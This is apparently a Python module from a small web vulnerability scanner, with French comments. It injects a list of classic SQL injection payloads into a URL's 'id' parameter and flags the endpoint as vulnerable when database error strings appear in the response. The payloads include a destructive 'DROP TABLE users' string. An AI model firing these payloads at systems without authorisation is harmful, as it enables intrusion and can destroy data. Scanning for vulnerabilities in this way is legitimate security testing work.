# scanner/sql_injection.py
import requests
import re

# Payloads SQL courants
SQL_PAYLOADS = [
    "'",
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
]

# Indicateurs d'erreurs SQL dans la réponse
SQL_ERRORS = [
    "You have an error in your SQL syntax;",
    "Warning: mysql_fetch_array()",
    "Unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "SQL syntax.*MySQL", 
    "ORA-01756",  
    "SQLite/JDBCDriver",
    "System.Data.SqlClient.SqlException"
]

# Vérifie si la réponse contient des erreurs SQL
def is_vulnerable(response_text):
    for err in SQL_ERRORS:
        if re.search(err, response_text, re.IGNORECASE):
            return True
    return False


# Test des SQL injection
def test_sql_injection(url):
    print(f"Test SQL injection sur : {url}")
    vulnerabilities = []

    for payload in SQL_PAYLOADS:
        try:
            # Ajout du payload en paramètre GET
            test_url = f"{url}?id={payload}"
            response = requests.get(test_url, timeout=5)

            if is_vulnerable(response.text):
                vulnerabilities.append((test_url, payload))
                print(f"[Alerte] Vulnérabilité détectée avec payload : {payload}")
        except requests.RequestException:
            continue

    return vulnerabilities
